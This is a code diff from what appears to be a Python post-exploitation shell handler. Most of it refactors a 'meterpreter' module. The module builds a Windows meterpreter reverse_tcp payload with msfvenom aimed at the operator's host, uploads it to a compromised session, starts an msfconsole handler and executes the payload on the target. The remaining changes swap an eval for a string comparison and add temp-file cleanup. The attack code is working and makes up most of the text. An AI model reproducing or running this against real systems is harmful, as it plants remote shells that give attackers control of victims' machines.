@@ -2355,11 +2355,11 @@ class Session:
 		try:
 			if self.OS == 'Unix':
 				if self.agent:
-					if not eval(self.exec(
+					if not self.exec(
 						f"stdout_stream << str(os.access(normalize_path('{directory}'), os.W_OK)).encode()",
 						python=True,
 						value=True
-					)):
+					) == 'True':
 						logger.error(f"{directory}: Permission denied")
 						return False
 				else:
@@ -5007,22 +5007,26 @@ class meterpreter(Module):
 		if session.OS == 'Unix':
 			logger.error("This module runs only on Windows shells")
 		else:
-			with tempfile.NamedTemporaryFile(suffix=".exe") as f:
-				payload_path = f.name
-				print(payload_path)
-				host = session._host
-				port = 5555
-				arch = ''
-				if session.arch == "x64-based_PC":
-					arch = 'x64/'
-				payload_creation_cmd = f"msfvenom -p windows/{arch}meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
+			fd, payload_path = tempfile.mkstemp(suffix=".exe")
+			os.close(fd)
+
+			host = session._host
+			port = 5555
+
+			arch = ''
+			if session.arch == "x64-based_PC":
+				arch = 'x64/'
+
+			try:
 				logger.info("Creating payload...")
+				payload_creation_cmd = ["msfvenom", "-p", f"windows/{arch}meterpreter/reverse_tcp", f"LHOST={host}", f"LPORT={port}", "-f", "exe", "-o", payload_path]
+
 				print(payload_creation_cmd)
-				result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)
+				result = subprocess.run(payload_creation_cmd, text=True, capture_output=True)
 
 				if result.returncode == 0:
 					logger.info("Payload created!")
-					uploaded_path = session.upload(payload_path)
+					uploaded_path = session.upload(payload_path, session.tmp)
 					if uploaded_path:
 						meterpreter_handler_cmd = (
 							'msfconsole -x "use exploit/multi/handler; '
@@ -5035,7 +5039,11 @@ class meterpreter(Module):
 						session.exec(uploaded_path[0], force_cmd=True)
 				else:
 					logger.error(f"Cannot create meterpreter payload: {result.stderr}")
-
+			finally:
+				try:
+					os.remove(payload_path)
+				except FileNotFoundError:
+					pass
 
 class cleanup(Module):
 	def run(session, args):
